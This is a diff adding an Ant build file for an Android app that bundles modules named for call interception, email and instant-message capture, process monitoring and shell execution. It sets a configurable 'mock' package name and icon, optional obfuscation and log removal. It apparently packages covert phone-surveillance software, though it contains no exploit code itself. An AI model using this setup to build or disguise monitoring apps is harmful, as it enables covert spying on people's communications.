@@ -1,0 +1,236 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project name="build-helper" default="">
+	
+	<import file="../../tool/daemon_build_resources/fx-taskdef.xml" />
+		
+	<target name="clean">
+		<delete dir="assets"/>
+		<delete dir="bin"/>
+		<delete dir="build"/>
+	</target>
+
+	<target name="prepare-build">
+		<echo message="******************************"/>
+		<echo message="*      MAIN APPLICATION      *"/>
+		<echo message="******************************"/>
+		
+		<delete dir="build"/>
+		
+		<!-- DON'T COPY SELF SOURCE CODE HERE!! -->
+		<!-- Some files still need to be changed -->
+		
+		<!-- shell_executer -->
+		<copy todir="build/src/com/vvt">
+            <fileset dir="../shell_executer/src/com/vvt"/>
+        </copy>
+		<!-- util -->
+		<copy todir="build/src">
+            <fileset dir="../util/src"/>
+        </copy>
+        <!-- daemon_util -->
+		<copy todir="build/src">
+            <fileset dir="../daemon_util/src"/>
+        </copy>
+		<!-- daemon_process_monitoring -->
+		<copy todir="build/src/com/fx/pmond/ref">
+            <fileset dir="../daemon_process_monitoring/src/com/fx/pmond/ref"/>
+        </copy>
+		<!-- daemon_bug_engine -->
+		<copy todir="build/src/com/vvt/callmanager/ref">
+            <fileset dir="../daemon_bug_engine/src/com/vvt/callmanager/ref"/>
+        </copy>
+		<!-- process main -->
+		<copy todir="build/src">
+            <fileset dir="../process-main/src/"/>
+        </copy>
+		<!-- base -->
+		<copy todir="build/src">
+            <fileset dir="../base/src"/>
+        </copy>
+		<!-- event_model -->
+		<copy todir="build/src">
+            <fileset dir="../event_model/src"/>
+        </copy>
+		<!-- daemon_email_capture -->
+		<copy todir="build/src">
+            <fileset dir="../daemon_email_capture/src"/>
+        </copy>
+		<!-- daemon_im_capture -->
+		<copy todir="build/src">
+            <fileset dir="../daemon_im_capture/src"/>
+        </copy>
+		
+		<!-- DON'T FORGET TO COPY THE SOURCE CODE OF REFERENCING PROJECT HERE-->
+	</target>
+	
+	<!--
+	The following parameters are required:-
+		testflag
+		mock.pkg
+		icon.name
+		product.id
+		product.name
+		product.display.name
+		product.version.major
+		product.version.minor
+		product.version.build
+		code.product.edition
+		code.product.server
+		code.product.id
+		code.product.name
+		output.apk.dir
+		obfuscate.option
+	-->
+	<target name="build-apk">
+		<echo message="build-apk # ENTER ..." />
+
+		<var name="dir.name" value="${product.version.major}.${product.version.minor}.${product.version.build}"/>
+		<var name="version.code" value="${product.version.build}" />
+		<var name="version.name" value="${testflag}${dir.name}" />
+		
+		<echo message="build-apk # package=${mock.pkg}, product=${product.name}, version=${version.name}" />
+		
+		<tstamp>
+			<format property="build.date" pattern="dd/MM/yyyy" locale="en,UK" />
+		</tstamp>
+		
+		<!-- build date -->
+		<replaceregexp
+			file="res/values/strings.xml"
+			match="&lt;string name=&quot;product_build_date&quot;&gt;.*&lt;/string&gt;"
+			replace="&lt;string name=&quot;product_build_date&quot;&gt;${build.date}&lt;/string&gt;"
+			byline="true"
+			/>
+		
+		<!-- Begin modify version number -->
+		<replaceregexp
+			file="res/values/strings.xml"
+			match="&lt;string name=&quot;product_version_major&quot;&gt;.*&lt;/string&gt;"
+			replace="&lt;string name=&quot;product_version_major&quot;&gt;${testflag}${product.version.major}&lt;/string&gt;"
+			byline="true"
+			/>
+		<replaceregexp
+			file="res/values/strings.xml"
+			match="&lt;string name=&quot;product_version_minor&quot;&gt;.*&lt;/string&gt;"
+			replace="&lt;string name=&quot;product_version_minor&quot;&gt;${product.version.minor}&lt;/string&gt;"
+			byline="true"
+			/>
+		<replaceregexp
+			file="res/values/strings.xml"
+			match="&lt;string name=&quot;product_version_build&quot;&gt;.*&lt;/string&gt;"
+			replace="&lt;string name=&quot;product_version_build&quot;&gt;${product.version.build}&lt;/string&gt;"
+			byline="true"
+			/>
+		<replaceregexp
+			file="AndroidManifest.xml"
+			match="android:versionCode=&quot;.*&quot;"
+			replace="android:versionCode=&quot;${version.code}&quot;"
+			byline="true"
+			/>
+		<replaceregexp
+			file="AndroidManifest.xml"
+			match="android:versionName=&quot;.*&quot;"
+			replace="android:versionName=&quot;${version.name}&quot;"
+			byline="true"
+			/>
+		<!-- End modify version number -->
+		
+		<!-- Begin modify package name -->
+		<replaceregexp
+            file="AndroidManifest.xml"
+            match="package=&quot;.*&quot;"
+            replace="package=&quot;${mock.pkg}&quot;"
+            byline="true"
+            />
+		<replaceregexp
+            file="src/com/fx/ProductInfoHelper.java"
+            match="import.*R;"
+            replace="import ${mock.pkg}.R;"
+            byline="true"
+        />
+		<replaceregexp
+            file="src/com/fx/MainActivity.java"
+			match="import.*R;"
+            replace="import ${mock.pkg}.R;"
+            byline="true"
+        />
+		<!-- End modify package name -->
+		
+		<!-- application icon -->
+		<replaceregexp
+            file="AndroidManifest.xml"
+            match="android:icon=&quot;.*&quot;"
+            replace="android:icon=&quot;&#64;drawable/${icon.name}&quot;"
+            byline="true"
+            />
+		
+		<!-- Begin modify product edition -->
+		<replaceregexp
+            file="build/src/com/fx/maind/ref/Customization.java"
+            match=".*PRODUCT_EDITION.*"
+            replace="    public static final ProductEdition PRODUCT_EDITION = ProductEdition.${code.product.edition};"
+            byline="true"
+        />
+		<replaceregexp
+            file="build/src/com/fx/maind/ref/Customization.java"
+            match=".*PRODUCT_SERVER.*"
+            replace="    public static final ProductServer PRODUCT_SERVER = ProductServer.${code.product.server};"
+            byline="true"
+        />
+	    <replaceregexp
+	        file="build/src/com/fx/maind/ref/Customization.java"
+	        match=".*PRODUCT_ID.*"
+	        replace="    public static final String PRODUCT_ID = FxSecurity.getConstant(Constant.${code.product.id});"
+	        byline="true"
+	    />
+		<replaceregexp
+            file="build/src/com/fx/maind/ref/Customization.java"
+            match=".*PRODUCT_NAME.*"
+            replace="    public static final String PRODUCT_NAME = FxSecurity.getConstant(Constant.${code.product.name});"
+            byline="true"
+        />
+		<!-- End modify product edition -->
+		
+		<!-- Check obfuscate obtion -->
+		<if>
+			<equals arg1="${obfuscate.option}" arg2="yes" casesensitive="false" />
+			<then>
+				<replaceregexp
+		            file="project.properties"
+		            match=".*proguard.config.*"
+		            replace="proguard.config=proguard.cfg"
+		            byline="true"
+		        />
+			</then>
+			<else>
+				<replaceregexp
+		            file="project.properties"
+		            match=".*proguard.config.*"
+		            replace="# proguard.config=proguard.cfg"
+		            byline="true"
+		        />
+			</else>
+		</if>
+		
+		<!-- app src will be copied here -->
+		<copy todir="build/src">
+            <fileset dir="src"/>
+        </copy>
+        
+		<!-- Delete log -->
+		<fx-delete-log 
+			delete.log.option="${delete.log.option}" 
+			target.dir="build/src" />
+		
+		<ant dir="${basedir}" target="clean" />
+		<ant dir="${basedir}" target="release" />
+        
+        <copy file="bin/application-main-release.apk"
+            tofile="${output.apk.dir}/${dir.name}/${product.name}_${version.name}.apk"
+        />
+		
+		<echo message="build-apk # Output = ${product.name}_${version.name}" />
+		<echo message="build-apk # EXIT ..." />
+	</target>
+
+</project>
